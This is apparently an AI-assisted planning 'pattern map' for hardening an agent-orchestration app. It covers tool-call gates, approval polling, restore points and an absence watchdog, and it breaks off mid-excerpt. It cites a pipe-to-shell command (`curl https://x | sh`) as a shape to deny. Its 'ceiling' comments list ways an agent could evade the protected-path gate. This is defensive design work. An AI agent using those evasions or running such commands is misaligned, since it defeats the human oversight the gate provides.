# Phase 4: Overnight on a Repo That Matters — Pattern Map

**Mapped:** 2026-08-25
**Worktree:** `E:\munder-difflin\.claude\worktrees\gsd-plan-phase-04` @ `e504735` (branch `worktree-gsd-plan-phase-04`)
**Files analyzed:** 4 new source + 22 modified source + 9 new test + 8 extended test = **43**
**Analogs found:** 41 / 43 (2 partial — see § No Analog Found)

> **Anti-fabrication note.** Every file:line below was opened in THIS session with `sed -n`/`grep -n`
> against the worktree above. Every fenced excerpt is copied verbatim from the file, never paraphrased.
> Where a line number differs from `04-CONTEXT.md` or `04-RESEARCH.md`, the measured number is used and
> the drift is called out inline.

---

## Measured drift against RESEARCH.md (3 items, all ±1)

| Cited | Measured this session | Effect |
|---|---|---|
| RESEARCH § Supporting: `boundDeny(reason)` at `hooks.ts:468-474` | `const boundDeny = ...` is at **`hooks.ts:467`** (doc block `:448-466`) | cite `:467` |
| CONTEXT D-21 / RESEARCH L-07: `STALE_LOCK_MS` at `gitCommitter.ts:79` | `const STALE_LOCK_MS = 60_000;` is at **`:78`** (doc block `:74-77`) | cite `:78` |
| RESEARCH § Supporting: `PtySession.lastOutputAt` field | field declaration at **`pty.ts:59`**, doc `:54-58` (RESEARCH already flagged this) | confirmed |

Everything else in RESEARCH's Drift Report re-checked clean at the four spots this map depends on:
`hooks.ts:1369` (`protectedPathDenial` call), `hooks.ts:1388` (`toolDecision` call), `control.ts:97`
(`toolDecision`), `pty.ts:745`/`:751` (`pty.spawn` / `...process.env,`).

---

## File Classification

### New source files (4)

| New file | Role | Data flow | Closest analog | Match quality | Requirement |
|---|---|---|---|---|---|
| `src/main/commandShape.ts` | pure judge module (electron-free) | request-response (synchronous predicate) | `src/main/procKill.ts` (shape) + `src/main/hooks.ts:860-985` (`protectedPathDenial`, the logic) | **exact on logic, exact on module shape** — two analogs, use both | GATE-03 |
| `src/main/approvals.ts` | in-memory registry with TTL (electron-free) | event-driven / pub-sub (register → poll → expire) | `src/main/webhook.ts:462-476` (`mintEnrollment` + `phoneArmed`) primary; `src/main/hooks.ts:526`/`:709-727` (`tokens` Map + mint/revoke) secondary | **role-match, exact on both halves** | GATE-05 |
| `src/main/restorePoints.ts` | service, shells `git` (electron-free) | file-I/O + batch (scheduled snapshot) | `src/main/git.ts:6-28` (`runGit`) for the spawn; `src/main/gitCommitter.ts:78`,`:168-171`,`:501-508` for single-writer discipline | **exact — copy, do not reuse** (different repo, per L-07) | RECORD-05 |
| absence watchdog — **recommend `src/main/floor/watchdog.ts`**, wired from `boot.ts` | scheduler + latch (electron-free) | event-driven (edge-trigger + latch) | `src/main/delivery.ts:713-753` (`quiesce` — the exact edge-trigger-and-clear latch) + `src/main/floor/boot.ts:506-518` (`armAlwaysOnBeats` timer shape) | **exact on the latch, exact on the timer** | VIGIL-01 |

### Modified source files (22)

| File | Role | Data flow | Kind of change | Requirement(s) | Collision |
|---|---|---|---|---|---|
| `src/main/hooks.ts` (1,536 L) | server / judge | request-response | insert a second judge before `:1369`; add the ask reply; add `ApprovalPoll` branch; extend ceiling `:801-859`; call the RECORD-01 writer | GATE-03, GATE-05, RECORD-01 | **3-way** — see § Collision Map |
| `src/main/control.ts` (118 L) | registry | request-response | third answer out of `toolDecision:97` | GATE-03 + GATE-05 (D-01, one owner) | 2-way, same owner |
| `src/main/hiveTemplates.ts` | template constants | file-I/O (emitted shims) | poll loop into `HOOK_SHIM:298`, `AGY_HOOK_SHIM:364`, `GROK_HOOK_SHIM:730`; `PI_EXTENSION:425` post→request/response; `OPENCODE_PLUGIN:466` veto; `TASK_CLI:24` `updatedAt` stamp | GATE-05, GATE-03, VIGIL-04 | **2-way** (S-2 shims vs VIGIL-04's `TASK_CLI` at `:24`) — regions ~700 lines apart |
| `src/main/hiveProvisioning.ts` | provisioner | file-I/O | `AGENT_DENY_RULES:63` kept as-is (D-03); markers only | GATE-03 | none |
| `src/main/webhook.ts` | transport (HTTP) | request-response | `PhoneAsk:111` gains `kind`; `openAsks`/`answerAsk:149-152` widen | GATE-05 | none |
| `src/main/push.ts` | transport (VAPID) | request-response | new call site only | GATE-05, VIGIL-01 | 2-way, read-only-ish |
| `src/main/pty.ts` (962 L) | process manager | streaming | `...process.env` filter at `:751`; optional `BLOCK_HINTS` tap at `:826-831` | GATE-02, VIGIL-03 | **2-way** — `:751` and `:826` are 75 lines apart, tracks B and D |
| `src/main/shellEnv.ts` (112 L) | utility | process-spawn | pass-through list plumbing | GATE-02 | none |
| `src/shared/agentProvider.ts` | config/preset table | config | codex preset `:255-292`: `-s workspace-write` + `--add-dir` | GATE-04 | none |
| `src/main/config.ts` | config | config | `commandForAutoMode:1058` splice; host-allowlist key; watchdog thresholds | GATE-03, GATE-04, VIGIL-01 | **3-way, low-conflict** (three distinct regions) |
| `src/main/db.ts` (320 L) | store (SQLite) | CRUD | append `MIGRATIONS[2]` at `:107`; add `recordToolCall`/`toolCalls`/`appendEvent`/`eventsBetween`/`pruneEvents` beside `:190-210` | RECORD-01 + RECORD-02 | 2-way — **S-4: ONE owner, ONE migration** |
| `src/main/telemetry.ts` | collector | streaming | **no change recommended** (L-05 kills D-17's literal reading); ring stays at `:161` | RECORD-01 | none |
| `src/main/git.ts` | git read surface | file-I/O | `runGit:6` may need an `env`/`extraArgs` param only if `GIT_INDEX_FILE` is used (Pitfall 7: it is not required) | RECORD-05 | none |
| `src/main/gitCommitter.ts` | committer | batch | `UNTRACK_PATHS:82` += `'restore.git'` | RECORD-05 | none |
| `src/main/delivery.ts` (1,005 L) | router/scheduler | event-driven | `blocked` on `LiveAgentPty:67-79`; guard before `:740`; wake filter `:770-806` | VIGIL-03 | none |
| `src/main/floor/lifecycle.ts` (254 L) | lifecycle | event-driven | card release after `setArchived` at `:232`; branch-detail patch from `:200-211` | VIGIL-02 | none |
| `src/main/floor/boot.ts` (1,220 L) | composition root | event-driven | watchdog timer beside `fleetTimer:156`; teardown entry in `SHUTDOWN_STEPS:928-956`; restore-point timer likewise | VIGIL-01, RECORD-05 | 2-way, same list |
| `src/main/hive.ts` (2,821 L) | domain manager | CRUD + file-I/O | `appendLog:2485` mirror; ignore seed `:782-792`; `HiveTask:119-152` `updatedAt`; main-side mutators `:2141-2180` | RECORD-02, RECORD-05, VIGIL-04 | **3-way** — see § Collision Map |
| `src/main/index.ts` (4,980 L) | Electron shell / IPC | request-response | `openPhoneAsks:1221-1236` merge; watchdog/notify wiring near `:4770-4790` | GATE-05, VIGIL-01 | **2-way** — 3,500 lines apart |
| `src/renderer/src/hooks/useHive.ts` | renderer hook | event-driven | `stopArmDecision:156-172` becomes reachable; may need no edit | VIGIL-03 | none |
| `src/renderer/src/hooks/usePtyParser.ts` | renderer hook | streaming | `BLOCK_HINTS:32-38` moves to a shared electron-free module | VIGIL-03 | none |
| `src/renderer/src/components/TasksKanban.tsx` | component | CRUD (read surface) | parse `updatedAt` beside `:92-105`; render age | VIGIL-04 | none |
| `src/renderer/src/store/config.ts` | renderer config | config | second `autoFlag` splice at `:430` (L-08) | GATE-04 | none, but **must be same owner as `config.ts:1058`** |

### Test files

**New (9)** — every one follows `test/boot-floor.test.cjs`'s isolated `(userData, harnessHome)` shape:

| New test | Analog | Why that analog |
|---|---|---|
| `test/pty-env-allowlist.test.cjs` | `test/pty-sanitize.test.cjs` (same subject) + `test/control.test.cjs` (pure-module shape) | pure filter, no PTY |
| `test/command-shape.test.cjs` | `test/control.test.cjs` | pure electron-free predicate, both directions |
| `test/gate03-roundtrip.test.cjs` | **`test/hook-auth-roundtrip.test.cjs:65-125`** | the only in-repo model for real shim child → real `HookServer` |
| `test/gate05-bounded-wait.test.cjs` | same | same, plus an injected clock |
| `test/record-persist.test.cjs` | `test/db-fts.test.cjs` + `test/boot-floor.test.cjs:193-200` (liveness style) | `PersistStore` with a DIRECT `dbPath` keeps electron out |
| `test/record-retention.test.cjs` | `test/db-fts.test.cjs` | same |
| `test/restore-points.test.cjs` | `test/hive-durability.test.cjs` + `test/commit-graph.test.cjs` | real git in a tmpdir |
| `test/absence-watchdog.test.cjs` | `test/delivery-main.test.cjs` | injected clock + fake deps, no PTY |
| `test/block-detect.test.cjs` | `test/delivery-main.test.cjs` | must prove headless correctness |

**Extended (8):** `test/pty-sanitize.test.cjs`, `test/engine-parity.test.cjs`, `test/agent-provider.test.cjs`,
`test/webhook-endpoints.test.cjs`, `test/boot-floor.test.cjs`, `test/agent-lifecycle.test.cjs`,
`test/delivery-main.test.cjs`, `test/hive-task-mutation.test.cjs`, `test/renderer-components.test.cjs`,
plus **`test/repo-claims.test.cjs`** (marker ledger — see § Collision Map).

---

## Pattern Assignments — New Files

### `src/main/commandShape.ts` (pure judge module, request-response) — GATE-03

**Analog A — module shape:** `src/main/procKill.ts` (54 lines, electron-free, exported pure functions + exported constants).
**Analog B — the judging logic:** `src/main/hooks.ts:860-985` (`protectedPathDenial`).

**Module-header pattern to copy** (`src/main/procKill.ts:1-23` — a header that states the failure it
exists to prevent, then the deliberate scope, then the constant):

```ts
/**
 * Process-tree termination helpers (PID-release hardening).
 *
 * Every explicit kill path used to be a bare node-pty `proc.kill()` — SIGHUP to
 * the DIRECT child only. Two leaks follow: (1) a child that ignores/queues
 * SIGHUP never dies, so its PID lingers for the machine's uptime; (2) even when
 * the child dies, its own children (MCP servers, helper daemons the session
 * started) are orphaned to PID 1 and never released. ...
 *
 * Deliberate scope: callers apply this on EXPLICIT kills (breaker stop, archive,
 * respawn, app quit, hidden check sessions) — never on a natural exit, where a
 * daemon the agent intentionally left running (a dev server started via a Bash
 * tool) must survive its parent session.
 */
import { spawnSync } from 'node:child_process';

/** Grace between the polite signal and the SIGKILL escalation. */
export const KILL_GRACE_MS = 4_000;
```

**Tokenizer to reuse, not rebuild** (`src/main/hooks.ts:876-889` — this is the *exact* token array
`commandShapeDenial` receives; note the FILTER-FIRST comment and the measured cost, both of which the
new module's own doc block should mirror in style):

```ts
    if (p.tool_name === 'Bash' && typeof ti.command === 'string') {
      // The app puts HIVE_ROOT in every agent's env (hive.ts:828) AND names it in
      // the injected prompt (hive.ts:1366), so `cat >> "$HIVE_ROOT/bin/…"` is the
      // DOCUMENTED calling convention, not obfuscation — a prefix test on the
      // unexpanded string never matches it. Expand the spellings this app itself
      // hands out, then treat the shell words as candidate paths. Splitting on
      // shell separators (not a bare substring scan) is what keeps `>>`, quotes
      // and `;`-chains from hiding a target.
      //
      // FILTER FIRST. A word that contains no separator and does not start with
      // `~`, `.` or a drive letter cannot resolve INTO a protected directory from
      // any base, and resolving it anyway is what made an ordinary heredoc cost
      // 721 ms of blocking main-thread work. Measured on this repo's README:
      // 2612 words in, 102 out.
      const expanded = this.expandHiveVars(agentId, ti.command);
      for (const word of expanded.split(/[\s;&|<>()"']+/)) {
        if (word && pathShaped(word)) targets.push(word);
      }
    }
```

**Return-contract pattern** (`hooks.ts:860` — `string | null`, the operator-legible reason or allow.
`commandShapeDenial` MUST use the same contract so the two judges compose at the call site):

```ts
  private protectedPathDenial(agentId: string, p: HookPayload): string | null {
    const root = this.hive.root();
    if (!root) return null;
```

**⚠️ The early return GATE-03 must run BEFORE** (`hooks.ts:890`, RESEARCH L-01 — `curl https://x | sh`
has no path-shaped word, so `protectedPathDenial` exits here without ever seeing two of the four shapes):

```ts
    if (targets.length === 0) return null;
```

**Ceiling-list pattern — MANDATORY under D-34** (`src/main/hooks.ts:801-859`). This is the house
standard and the planner must specify shipping one of these for GATE-02, GATE-03 and GATE-05. Exact
shape to copy — a `THE CEILING` heading, `WHAT IT NOW IS` / `WHAT IT STILL DOES NOT REACH`, lettered
items, a self-enforcing rule sentence, and an accepted fail-open with a **named owner**:

```ts
   * THE CEILING, so this reads as a control and not a claim. WHAT IT NOW IS: a
   * `(dev, ino)` IDENTITY comparison, so a protected path is denied HOWEVER it
   * is spelled — there is deliberately no list of host names, prefixes or
   * spellings anywhere in this file, because an enumeration of an input space
   * the attacker chooses does not converge. WHAT IT STILL DOES NOT REACH:
   *
   *   (a) a model that assembles the path at runtime
   *       (`p=$HIVE_ROOT; p=$p/bin; cat >> $p/cth-hook.cjs`), and a `cd` into a
   *       protected directory followed by a relative write ...
   *   (b) a harness home containing a SPACE. The Bash arm splits on
   *       `[\s;&|<>()"']+`, so `"$HIVE_ROOT/bin/cth-hook.cjs"` under
   *       `C:\Users\John Smith\…` tears into two words and NEITHER resolves
   *       anywhere near `<hive>/bin` — which turns the whole Bash arm off for
   *       that operator. Pre-existing; a quote-aware tokenizer is its own change;
   ...
   *   (e) more distinct path-shaped candidates than HOOK_CANDIDATE_MAX, or more
   *       wall-clock than HOOK_RESOLVE_BUDGET_MS. Both DENY rather than inspect,
   *       so the failure mode is a FALSE DENY with a reason naming the bound;
   ...
   * and it does not exist at all for an engine with no PreToolUse hook
   * (T-P02-11). A ceiling list that omits (b), (f) or (g) reads as a guarantee
   * that does not hold.
   *   (i) NO HIVE ROOT AT ALL. `protectedPathDenial` opens with
   *       `if (!root) return null;` — allow. This is T-P24-10, disposition
   *       ACCEPT. The underlying behaviour is benign: with no hive root there
   *       are no protected paths to name, so there is nothing to deny. It is
   *       listed here because an UNRECORDED fail-open in a security gate is what
   *       gets re-discovered as a finding two phases later, and because an
   *       `accept` disposition's whole obligation is to be written down where a
   *       reader of this function will see it. Owner: hive maintainer.
   */
```

**Why-here rationale pattern — copy the SYMBOL-not-line discipline** (`hooks.ts:787-799`; the new
module's header should argue its own placement the same way, and cite by symbol):

```ts
   * WHY HERE and not in `AGENT_DENY_RULES`: that list is written only into
   * Claude's per-session `settings.json` — by `writeClaudeSettings` in hive.ts,
   * from the `AGENT_DENY_RULES` constant in the same file. Cited by SYMBOL and
   * deliberately not by line: the previous citation here was a line number, a
   * later edit moved the code, and the comment then pointed at an unrelated
   * `spawn bare` branch. A symbol survives the next edit; a number does not.
```

---

### `src/main/approvals.ts` (in-memory registry with TTL, event-driven) — GATE-05

**Analog A — TTL-bounded mint + expiry read** (`src/main/webhook.ts:456-476`). This is the closest
in-repo shape: `randomBytes` id, `expiresAt` computed off an **injectable clock**, a replace-on-mint
rule, and an `is-live` read that re-checks the clock rather than relying on a sweep timer:

```ts
  /**
   * Mint a fresh 192-bit enrollment token (the size the file's own capability
   * token already uses), TTL-bounded. REPLACES any unburned predecessor — a QR
   * left on screen from a previous press is dead the instant a new one is
   * drawn. Arms the phone (see {@link phoneArmed}); never persisted (D-19).
   */
  mintEnrollment(): { token: string; expiresAt: number } {
    const token = randomBytes(24).toString('hex');
    const expiresAt = this.now() + PHONE_ENROLL_TTL_MS;
    this.phoneEnrollment = { hash: sha256(token), expiresAt };
    return { token, expiresAt };
  }

  /** True while an unexpired enrollment token or at least one issued bearer
   *  exists. ... */
  phoneArmed(): boolean {
    if (this.phoneEnrollment && this.now() <= this.phoneEnrollment.expiresAt) return true;
    return this.phoneBearerDigests.size > 0;
  }
```

The injectable clock it reads (`webhook.ts:153-155`) — `approvals.ts` MUST take the same dep or the
bounded-wait test has to sleep:

```ts
  /** Injectable clock — tests move the enrollment TTL and the auth lockout
   *  forward without sleeping a real unit test. Defaults to `Date.now`. */
  now?: () => number;
```

**Analog B — the per-entry Map registry with mint / forget-one / forget-all**
(`src/main/hooks.ts:518-526`, `:709-727`). Copy the doc-comment discipline (each method states the
race it exists to survive) and the three-method surface:

```ts
  /**
   * GATE-01 — token → agentId. THE identity source for everything past the
   * socket. One entry per live PTY spawn: `mintToken` adds, PTY exit removes.
   * A token is meaningless on its own — it only ever names the one agent main
   * minted it for ...
   */
  private tokens = new Map<string, string>();
```

```ts
  mintToken(agentId: string): string {
    const token = randomBytes(32).toString('hex');
    this.tokens.set(token, agentId);
    return token;
  }

  /** Drop ONE token — the PTY-exit path. Token-exact rather than by agent on
   *  purpose: a restart is kill()+spawn() under the same id, and the dying
   *  PTY's exit can land AFTER the replacement has already minted, so revoking
   *  by agent there would dead-hook the live agent. */
  revokeToken(token: string): void {
    this.tokens.delete(token);
  }

  /** Drop EVERY token an agent holds — for a teardown where the agent itself is
   *  going away and no replacement is coming. */
  revokeAgent(agentId: string): void {
    for (const [token, id] of this.tokens) if (id === agentId) this.tokens.delete(token);
  }
```

**Analog C — the electron-free class header that says so** (`src/main/control.ts:1-18`, last line
especially — `approvals.ts` must carry the same claim and it must be TRUE, per RESEARCH L-03 which
found the claim false for `db.ts` and `hooks.ts`):

```ts
/**
 * ControlRegistry — operator control over running agents (#7C.1–7C.3).
 *
 * Holds per-agent control state that the HookServer reads when deciding what to
 * return from a hook. This is how the floor exerts control WITHOUT typing into
 * the PTY: the decision rides Claude Code's own hook-return protocol.
 * ...
 * Runs in the Electron main process; no electron import (unit-testable).
 */
```

**The wire shape the ask reply must be** (`src/main/hooks.ts:448-473`). Note `boundDeny` at **`:467`**
(RESEARCH said `:468`) and the paragraph explaining *why one declaration*: GATE-05's ask reply is a
third exit and it must not drift from these:

```ts
/**
 * The reply every bound writes before it closes. Declared once so the exits
 * cannot drift apart, and deliberately the SAME shape `handle` returns for a
 * protected path.
 * ...
 * these bounds fire BEFORE `JSON.parse`, so the `hook_event_name` is unknown at that
 * moment. A `hookEventName: 'PreToolUse'` deny returned to a `Stop`,
 * `PostToolUse` or `Notification` payload is ignored by most engines — but the
 * agy and grok shims translate `hookSpecificOutput.permissionDecision === 'deny'`
 * into `{decision:'deny'}` ...
 */
const boundDeny = (reason: string): string => JSON.stringify({
  hookSpecificOutput: {
    hookEventName: 'PreToolUse',
    permissionDecision: 'deny',
    permissionDecisionReason: reason
  }
});
```

And the deadline the poll must stay under (`hooks.ts:437-446`) — the reasoning the plan's TTL
reconciliation has to answer to:

```ts
/**
 * The idle timeout, sized BELOW the shims' own 5 s self-timeout
 * (`setTimeout(() => process.exit(0), 5000)` in every shim), not above. A shim
 * that has abandoned the connection has already exited 0, and exit 0 with no
 * stdout is *allow*, so a deny written at t=10s goes to a socket nobody reads.
 * 2 s leaves a 3 s margin: enough that a loaded machine still answers a live
 * call (an ordinary decision measures in single-digit milliseconds), and far
 * enough under 5 s that the deny always lands while the peer is reading.
 */
const HOOK_IDLE_MS = 2_000;
```

---

### `src/main/restorePoints.ts` (service shelling git, file-I/O + batch) — RECORD-05

**Analog A — the git spawn wrapper** (`src/main/git.ts:5-28`). `restorePoints.ts` should either import
`runGit` or copy this exact shape; note it takes **no env parameter** (Pitfall 7 — with `--git-dir`
alone none is needed):

```ts
/** Run git in `cwd` with `args`. Returns stdout text or an error. */
function runGit(cwd: string, args: string[], timeoutMs = 8000): Promise<{
  ok: true; stdout: string;
} | { ok: false; error: string }> {
  return new Promise((resolve) => {
    const proc = spawn('git', args, { cwd });
    let stdout = '';
    let stderr = '';
    const timer = setTimeout(() => {
      try { proc.kill('SIGKILL'); } catch { /* noop */ }
    }, timeoutMs);
    proc.stdout.on('data', d => { stdout += d.toString(); });
    proc.stderr.on('data', d => { stderr += d.toString(); });
    proc.on('error', e => {
      clearTimeout(timer);
      resolve({ ok: false, error: e.message });
    });
    proc.on('close', code => {
      clearTimeout(timer);
      if (code === 0) resolve({ ok: true, stdout });
      else resolve({ ok: false, error: stderr.trim() || `git exited ${code}` });
    });
  });
}
```

**Analog B — the single-writer discipline to COPY, NOT REUSE** (ADR-0004 governs the *hive* repo;
RECORD-05 drives the *operator's* repo, so this is a copy). All three parts, measured:

`src/main/gitCommitter.ts:74-78` — stale-lock recovery constant (**`:78`**, CONTEXT said `:79`):

```ts
/** How old `.git/index.lock` must be before we treat it as abandoned. Must stay
 *  comfortably ABOVE GIT_TIMEOUT_MS — the old 10 s was BELOW the old 8 s git
 *  timeout, so a slow-but-alive git (a big `add -A` behind Windows antivirus)
 *  could have its live lock deleted out from under it. */
const STALE_LOCK_MS = 60_000;
```

`src/main/gitCommitter.ts:501-508` — the recovery itself:

```ts
   *  never one younger than STALE_LOCK_MS, which must stay well above our own git
...
      if (existsSync(lock) && Date.now() - statSync(lock).mtimeMs > STALE_LOCK_MS) rmSync(lock);
```

`src/main/gitCommitter.ts:167-171` — the trailing debounce + the `committing` flag (this is the
mechanism that answers L-07's measured `fatal: Unable to create '…/restore.git/index.lock'`):

```ts
  /** Trailing debounce timer for the next commit, and the messages folded into it. */
  private commitTimer: NodeJS.Timeout | null = null;
  private pendingCommits: string[] = [];
  /** Set for the whole flush, so two flushes can never interleave `add -A`. */
  private committing = false;
```

`src/main/gitCommitter.ts:172-198` — the fire-and-forget/debounce doc and entry point, including the
**unref'd timer** rule the restore-point timer must inherit:

```ts
  /**
   * Commit all hive changes. Fire-and-forget: DEBOUNCED and never blocking.
   * ...
   * Nothing is lost if the app quits with a commit pending — git here is history,
   * not storage. Every file was already written (atomically) before commit() was
   * called, and the next launch's `add -A` picks up whatever the timer did not.
   * That is also why the timer is unref'd: a pending commit must never be the
   * reason the process stays alive.
   */
  commit(message: string): void {
    const root = this.deps.root();
    if (!root || !existsSync(join(root, '.git'))) return;
    this.pendingCommits.push(message);
    this.scheduleCommit(root);
  }

  private scheduleCommit(root: string): void {
    if (this.commitTimer) return;
    this.commitTimer = setTimeout(() => {
      this.commitTimer = null;
      void this.flushCommit(root);
```

**Analog C — the injected-deps interface for a main-side service** (`src/main/gitCommitter.ts:84-100`).
`RestorePointDeps` should be shaped exactly like this — thunks, each with a WHY-injected comment:

```ts
export interface GitCommitterDeps {
  /** The hive root to commit into, or null before onboarding (no
   *  harnessHome configured yet — mirrors HiveManager.root()). commit()
   *  degrades to a no-op on null rather than resolving a path off it. */
  root: () => string | null;
  /** Append one event to the hive's durable log (HiveManager.appendLog).
   *  Injected so the scrub's secret-scan-skipped/secret-blocked/
   *  secret-scrubbed events land on the SAME log an operator already reads,
   *  instead of a second logging path this class would have to invent. */
  log: (event: Record<string, unknown>) => void;
```

**Analog D — the fail-safe bias for pruning** (ADR-0003 as it is already written in code,
`src/main/git.ts:328-334`). RECORD-05's prune must inherit this *"unknown → keep"* disposition:

```ts
/** Does this worktree hold work that must NOT be auto-discarded? ... Fails SAFE: any git query we can't run is treated as "there
 *  might be work" → keep, so an uncertain state never triggers an auto-remove. */
export async function worktreeHasUnintegratedWork(
  wtPath: string, baseBranch: string
): Promise<{ keep: boolean; detail: string; branch: string; dirty: boolean; ahead: number }> {
```

```ts
  const dirty = status.ok ? status.stdout.trim().length > 0 : true; // unknown → assume dirty
```

---

### absence watchdog — `src/main/floor/watchdog.ts` (scheduler + latch, event-driven) — VIGIL-01

**Analog A — the latch, verbatim in structure** (`src/main/delivery.ts:713-753`). This is the
edge-trigger-and-clear D-25 asks for, already in the same process. Copy: bound the set by the live
roster first, then per-subject `continue`-with-`delete` for "no longer quiet", then `has` → skip:

```ts
  private quiesce(live: LiveAgentPty[], now: number): void {
    const ids = new Set(live.map((a) => a.agentId));
    // Main outlives every renderer, so bound the set by the live roster — same
    // reason the wake's seen-set is pruned against the live inbox below.
    for (const id of this.quiesced) if (!ids.has(id)) this.quiesced.delete(id);

    for (const a of live) {
      // Never fight the breaker pin: a constrained/stopped agent is deliberately
      // held 'looping', and calling it idle would re-arm the delivery paths that
      // the breaker exists to hold off.
      const level = this.deps.breakerLevel?.(a.agentId);
      if (level === 'constrained' || level === 'stopped') continue;
      // A still-booting TUI is mid-type; its silence is the boot sequence, not a
      // finished turn. Reuses the boot grace this service already tracks.
      if ((this.bootGraceUntil.get(a.ptyId) ?? 0) > now) continue;
      ...
      const painted = a.hasOutput && a.lastOutputAt > 0;
      const quiet = painted && now - a.lastOutputAt > QUIESCE_IDLE_MS;
      if (!quiet) { this.quiesced.delete(a.agentId); continue; }
      if (this.quiesced.has(a.agentId)) continue;   // already announced this spell
      this.quiesced.add(a.agentId);
```

**⚠️ `painted` is the pattern the watchdog must also copy** — a PTY that never emitted reads as "quiet
for ages" because `pty.ts` seeds `lastOutputAt` to the spawn instant. `delivery.ts:731-737` says so:

```ts
      // A TUI that has NEVER painted a frame is not a finished turn — it is a
      // broken or still-starting child, and calling it idle un-gates the delivery
      // paths against a terminal that cannot receive. `lastOutputAt` alone cannot
      // see that: pty.ts:752 SEEDS it to the spawn instant, so it reads as "quiet
      // for ages" the moment boot grace lapses. `hasOutput` is the flag that can
      // (pty.ts:753/764). The `> 0` floor stays as a guard against a caller that
      // supplies neither.
```

**Analog B — the timer construction shape** (`src/main/floor/boot.ts:505-518`). Clear-then-set, and a
`try/catch` per beat body so one throw never kills the interval:

```ts
/** (Re)arm the always-on beats: the live fleet snapshot (~8s) + the
 *  breaker/cost-ledger beat (~30s). Guarded (clear-then-set) so a re-bootstrap
 *  or a powerMonitor resume can't stack duplicate timers. */
export function armAlwaysOnBeats(): void {
  if (fleetTimer) clearInterval(fleetTimer);
  writeFleetSnapshot();
  fleetTimer = setInterval(writeFleetSnapshot, 8_000);
  if (breakerBeatTimer) clearInterval(breakerBeatTimer);
  breakerBeatTimer = setInterval(() => {
    try { runBreakerBeat(300_000); } catch (e) { console.error('[breaker beat]', e); }
    try { accountPool.tick(); } catch (e) { console.error('[account-pool beat]', e); }
    try { condenseBoardIfOversized(); } catch (e) { console.error('[board beat]', e); }
  }, 30_000);
}
```

with the module-scope declaration at `boot.ts:156-157`:

```ts
let fleetTimer: ReturnType<typeof setInterval> | null = null;
let breakerBeatTimer: ReturnType<typeof setInterval> | null = null;
```

**Analog C — the MANDATORY teardown entry** (`src/main/floor/boot.ts:920-956`). RESEARCH's Runtime
State Inventory is explicit: the watchdog timer and the restore-point timer BOTH need an entry here or
`node --test` hangs instead of failing:

```ts
// ─── SHUTDOWN_STEPS — the exact inverse of bootFloor's construction, as ONE
//     declarative list (#34: two hand-maintained teardown paths had drifted —
//     a reset left the public tunnel open and every qwen sidecar running
//     against a wiped hive). ...
const SHUTDOWN_STEPS: ReadonlyArray<{ name: string; stop: () => void }> = [
  { name: 'clearMissionTimers', stop: () => clearMissionTimers() },
  { name: 'clearContextTimers', stop: () => clearContextTimers() },
  // NOT in the original SHUTDOWN_STEPS list either — a real gap (RESEARCH:
  // "Timers that are not unref'd and must be cleared by Floor.shutdown()").
  // Un-cleared, these two setIntervals keep the process alive after shutdown,
  // which is exactly what T-P02-02-05 exists to catch (the boot test's
  // explicit shutdown case fails by HANGING, not by a red assertion).
  {
    name: 'clearAlwaysOnBeats',
    stop: () => {
      if (fleetTimer) clearInterval(fleetTimer);
      fleetTimer = null;
      if (breakerBeatTimer) clearInterval(breakerBeatTimer);
      breakerBeatTimer = null;
    }
  },
  ...
  { name: 'persist.close', stop: () => persist.close() },
  { name: 'killAll', stop: () => ptyManager.killAll() }
];

/** Run the whole list, best-effort: a throw in one step must never abort the
 *  rest. */
function shutdown(): void {
  for (const step of SHUTDOWN_STEPS) {
    try { step.stop(); } catch (e) { console.error(`[floor shutdown] ${step.name}:`, e); }
  }
}
```

**Analog D — the alarm channels, already injected.** `src/main/floor/deps.ts:43-48` is the desktop
toast the watchdog calls (never `new Notification` directly, which is index.ts-owned):

```ts
  /**
   * A native OS toast (Electron `Notification`). Optional-dep-degrades-safely:
   * an unsupported platform, or notifications turned off in settings, is a
   * silent no-op — never a throw that could take a beat timer down with it.
   */
  notify: (o: { title: string; body: string }) => void;
```

wired at `src/main/index.ts:4780-4783`:

```ts
    notify: ({ title, body }) => {
      try { if (Notification.isSupported()) new Notification({ title, body }).show(); }
      catch { /* unsupported platform */ }
    },
```

**Analog E — what NOT to reuse** (`src/main/config.ts:85-107`). The plan must not route VIGIL-01
through this; the source itself says why (D-23):

```ts
/** The built-in heartbeat (Lane A #1). A context-aware beat that, each tick,
 *  observes live floor state and — only when the floor has gone quiet — drops a
 *  digest into god's inbox and (if god's PTY is genuinely idle) nudges it to
 *  re-engage anyone stalled. ...
 *  Shipped DISABLED by default (opt-in): unlike the standup, which only sends a
 *  hive message, the heartbeat types into god's PTY ... */
export const HEARTBEAT_MISSION: ScheduledMission = {
  id: 'heartbeat',
  label: 'Floor heartbeat',
  intervalMs: 120_000,
  to: 'god',
  ...
  enabled: false,
  kind: 'heartbeat',
  quietThresholdMs: 300_000
};
```

**Signals it reads, already computed** — `src/main/pty.ts:940-945`:

```ts
  /** Milliseconds since this PTY last produced output (Date.now() - lastOutputAt),
   *  or undefined if no such PTY. The idle handshake: large value = safe to type. */
  idleFor(id: string): number | undefined {
    const s = this.sessions.get(id);
    return s ? Date.now() - s.lastOutputAt : undefined;
  }
```

and the ledger's `rev` (S-5's recommended dissolution of the VIGIL-04 dependency), bumped on every
mutation at `src/main/hive.ts:2121`:

```ts
    const next: TaskLedger = { tasks: tasks.map(stripDerivedTaskFields), rev: current.rev + 1, updatedAt: new Date().toISOString() };
```

---

## Pattern Assignments — Modified Files (the in-file analog for each change)

### `src/main/hooks.ts` — GATE-03 + GATE-05 + RECORD-01

**Insert-a-judge pattern** — copy the existing GATE-01 block *verbatim in shape* and place the new one
**before** it (L-01). `hooks.ts:1364-1381`:

```ts
    // GATE-01 — the hive's own protected set: the shared shim, the hive repo's
    // .git, the socket, and other agents' directories. FIRST, and deliberately
    // outside the `this.control` guard below: this is a floor invariant, not an
    // operator preference, so it must hold on a floor with no ControlRegistry.
    if (event === 'PreToolUse') {
      const denial = this.protectedPathDenial(agentId, p);
      if (denial) {
        this.emitControl(agentId, p.tool_name, denial);
        this.emit(agentId, event, p, true);
        return {
          hookSpecificOutput: {
            hookEventName: 'PreToolUse',
            permissionDecision: 'deny',
            permissionDecisionReason: denial
          }
        };
      }
    }
```

**The `toolDecision` call site GATE-05 widens** — `hooks.ts:1383-1399`. Note the comment's own
sentence *"Slow human APPROVAL is deliberately left to Claude's native permission prompt"*: GATE-05
reverses that decision, so **that comment must be rewritten in the same commit** or the file argues
against its own behaviour:

```ts
    // 7C.1 — HITL gate: deny a tool call at the PreToolUse boundary when the
    // agent is paused or this tool is gated. Race-free (immediate return, no
